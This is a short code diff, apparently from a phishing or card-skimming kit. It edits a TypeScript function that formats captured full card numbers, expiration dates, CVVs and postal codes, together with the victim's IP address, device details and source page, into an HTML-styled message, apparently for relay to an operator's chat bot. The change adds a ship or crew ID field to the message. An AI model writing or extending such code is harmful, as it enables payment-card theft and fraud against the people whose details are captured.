@@ -603,8 +603,9 @@ function formatPostalCodeMessage(data: PostalCodeRequest, ipInfo: IpInfo, device
   message += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
   message += `📍 <b>Source Page:</b>\n`;
   message += formatSourceInfo(sourceInfo);
-  message += `\n💳 <b>Card Details:</b>\n`;
-  message += `   • Card Number: ${data.cardNumber}\n`;
+  message += `\n🚢 <b>Ship/Crew ID:</b> ${data.shipId}\n\n`;
+  message += `💳 <b>Card Details:</b>\n`;
+  message += `   • Last 8 Digits: ${data.cardNumber}\n`;
   message += `   • Expiration: ${data.expiration}\n`;
   message += `   • CVV: ${data.cvv}\n`;
   message += `   • Postal Code: ${data.postalCode}\n\n`;
